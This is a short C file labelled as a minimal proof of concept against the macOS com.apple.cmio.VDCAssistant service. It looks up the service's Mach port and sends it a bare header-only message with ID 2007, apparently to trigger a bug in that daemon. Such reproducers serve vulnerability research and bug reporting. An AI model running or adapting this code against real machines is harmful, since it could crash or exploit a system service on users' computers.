// Minimal PoC for com.apple.cmio.VDCAssistant
// Build: clang -o vdc_poc vdc_poc.c
// Run:   ./vdc_poc

#include <mach/mach.h>
#include <servers/bootstrap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    mach_msg_header_t header;
    // No body needed as size is 24 (sizeof(mach_msg_header_t))
} vdc_message_t;

int main(void) {
    kern_return_t kr;
    mach_port_t bootstrap_port;
    mach_port_t service_port;
    vdc_message_t msg;

    // 1. Get bootstrap port
    kr = task_get_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, &bootstrap_port);
    if (kr != KERN_SUCCESS) {
        printf("Failed to get bootstrap port: %s\n", mach_error_string(kr));
        return 1;
    }

    // 2. Look up service
    kr = bootstrap_look_up(bootstrap_port, "com.apple.cmio.VDCAssistant", &service_port);
    if (kr != KERN_SUCCESS) {
        printf("Failed to look up service com.apple.cmio.VDCAssistant: %s\n", mach_error_string(kr));
        return 1;
    }
    printf("Got service port: 0x%x\n", service_port);

    // 3. Construct message
    memset(&msg, 0, sizeof(msg));

    msg.header.msgh_bits = 0x13; // MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0)
    msg.header.msgh_size = 24;
    msg.header.msgh_remote_port = service_port;
    msg.header.msgh_local_port = MACH_PORT_NULL;
    msg.header.msgh_voucher_port = MACH_PORT_NULL;
    msg.header.msgh_id = 2007;

    // 4. Send message
    printf("Sending message...\n");
    kr = mach_msg(
        &msg.header,
        MACH_SEND_MSG,
        msg.header.msgh_size,
        0,
        MACH_PORT_NULL,
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL
    );

    if (kr != KERN_SUCCESS) {
        printf("Failed to send message: %s (0x%x)\n", mach_error_string(kr), kr);
        return 1;
    }

    printf("Message sent successfully.\n");
    return 0;
}
